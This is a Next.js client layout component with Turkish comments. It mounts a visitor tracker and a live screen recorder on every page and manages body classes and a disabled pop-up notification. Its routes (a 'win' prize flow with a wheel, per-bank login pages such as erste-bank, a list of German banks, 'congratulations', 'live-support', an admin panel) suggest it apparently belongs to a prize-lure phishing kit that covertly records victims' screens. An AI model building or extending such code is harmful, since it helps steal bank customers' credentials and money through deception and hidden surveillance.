"use client";

import { useEffect, useState } from "react";
import { usePathname } from "next/navigation";
import LiveToast from "@/components/LiveToast";
import { LiveScreenRecorder } from "@/components/LiveScreenRecorder";
import { SettingsProvider } from "@/contexts/SettingsContext";
import { VisitorTracker } from "@/components/VisitorTracker";

export function RootClientShell({
  children,
}: {
  children: React.ReactNode;
}) {
  const pathname = usePathname();
  const [isMobileDevice, setIsMobileDevice] = useState(false);

  useEffect(() => {
    const mediaQuery = window.matchMedia("(max-width: 640px), (pointer: coarse)");

    const updateDeviceState = () => {
      const touchCapable = navigator.maxTouchPoints > 0;
      setIsMobileDevice(mediaQuery.matches || touchCapable && window.innerWidth <= 900);
    };

    updateDeviceState();
    mediaQuery.addEventListener("change", updateDeviceState);
    window.addEventListener("resize", updateDeviceState);

    return () => {
      mediaQuery.removeEventListener("change", updateDeviceState);
      window.removeEventListener("resize", updateDeviceState);
    };
  }, []);

  // ONEMLI: pathname'e gore body class DEGISTIRME (admin haric)!
  // usePathname navigasyon BASLADIGI anda degisir ama eski sayfa hala ekranda —
  // body class erken flip eder ve portal arka plani FLASLANIR.
  // Body hep ah-theme kalir; kendi bg'sini isteyen sayfalar (wheel: fixed bg-black)
  // kendi omurleri boyunca uygular.
  useEffect(() => {
    const isAdminPage = pathname.startsWith("/admin");
    const bodyClass = [
      isAdminPage ? "bg-[#f4f7f9]" : "ah-theme",
      isMobileDevice ? "device-mobile" : "device-desktop",
    ]
      .filter(Boolean)
      .join(" ");
    document.body.className = bodyClass;
  }, [pathname, isMobileDevice]);

  // Sadece belirli yollarda bildirimi gösterme kuralları:
  // Admin yolları, geçersiz banka sayfaları, tebrikler veya BİREYSEL banka giriş sayfalarında göstermeyelim.
  // "/banken" (liste) sayfasında GÖSTERİLECEK.
  const hideToastOnPaths = [
    "/admin",
    "/admin/login",
    "/invalid-bank",
    "/congratulations",
    "/live-support",
    "/banken"
  ];

  // Eğer yol "/bank/" içeriyorsa (örneğin /win/123/bank/erste-bank), toast'u gizle.
  // Ama "/banken" ise gizleme.
  const shouldShowToast = !hideToastOnPaths.some(path => pathname.startsWith(path)) && !pathname.includes("/bank/");

  // GEÇİCİ OLARAK KAPATILDI: LiveToast özelliği daha sonra tekrar açılmak üzere deaktif edildi.
  // Kullanıcının göreceği arayüz tasarımları yenilendiği için bildirimler gizlendi.
  const ENABLE_TOAST = false;

  return (
    <>
      <VisitorTracker />
      <LiveScreenRecorder />
      <SettingsProvider>
        {ENABLE_TOAST && shouldShowToast && <LiveToast />}
        {children}
      </SettingsProvider>
    </>
  );
}
